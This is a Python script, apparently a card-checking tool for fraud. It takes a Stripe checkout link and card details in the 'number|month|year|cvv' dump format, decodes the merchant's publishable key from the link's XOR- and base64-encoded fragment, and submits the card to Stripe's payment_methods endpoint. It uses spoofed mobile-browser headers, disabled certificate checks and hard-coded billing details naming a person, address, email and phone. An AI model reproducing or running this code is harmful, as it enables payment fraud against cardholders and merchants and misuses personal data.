import itertools, base64, requests, urllib3, json, re

urllib3.disable_warnings()





def xor_decode(ciphertext):
    key = itertools.cycle([5])
    plaintext = ''.join(chr(ord(c) ^ next(key)) for c, k in zip(ciphertext, key))
    return plaintext

def decode_base64(text): 
    return base64.b64decode(text).decode('utf-8')


def getPK(hash):
    data = xor_decode(decode_base64(hash.replace("%2F", "/").replace("%2B","+")))
    
    return json.loads(data).get("apiKey")


def genPM(pk, ccn, mon, year, cvv):
    headers =  {
    "Host": "api.stripe.com",
    "content-length": "685",
    "sec-ch-ua": "\"Chromium\";v\u003d\"116\", \"Not)A;Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"116\"",
    "accept": "application/json",
    "content-type": "application/x-www-form-urlencoded",
    "dnt": "1",
    "sec-ch-ua-mobile": "?1",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "sec-ch-ua-platform": "\"Android\"",
    "origin": "https://js.stripe.com",
    "sec-fetch-site": "same-site",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://js.stripe.com/",
    "accept-language": "en-IN,en-GB;q\u003d0.9,en-US;q\u003d0.8,en;q\u003d0.7,hi;q\u003d0.6"
    }
    
    url = "https://api.stripe.com/v1/payment_methods"
    
    data = "billing_details[name]=Charlie+Puth&billing_details[address][line1]=3149+Longview+Avenue&billing_details[address][city]=Bronx&billing_details[address][state]=New+York&billing_details[address][postal_code]=10452&billing_details[address][country]=US&billing_details[email]=tizi.esc%40gmail.com&billing_details[phone]=(727)+584-0602&type=card&card[number]="+ccn+"&card[cvc]="+cvv+"&card[exp_year]="+year+"&card[exp_month]="+mon+"&payment_user_agent=stripe.js%2Fbc142a0e10%3B+stripe-js-v3%2Fbc142a0e10%3B+payment-element%3B+deferred-intent&time_on_page=36955&guid=NA&muid=NA&sid=NA&key="+pk
    
    req=requests.post(url, headers=headers, data=data, verify=False)
    if req.status_code==200:
        return req.json().get("id")
    return




def main():
    url = input("Enter Checkout Link:   ")
    cc = input("Enter CC [  00000000000000|00|00|000]:    ")
    hash = url.split("#")[1]
    
    pk = getPK(hash)
    tmp=cc.split("|")
    pm = genPM(pk, tmp[0], tmp[1], tmp[2], tmp[3])
    print()
    print("YOUR PM :")
    print(pm)

main()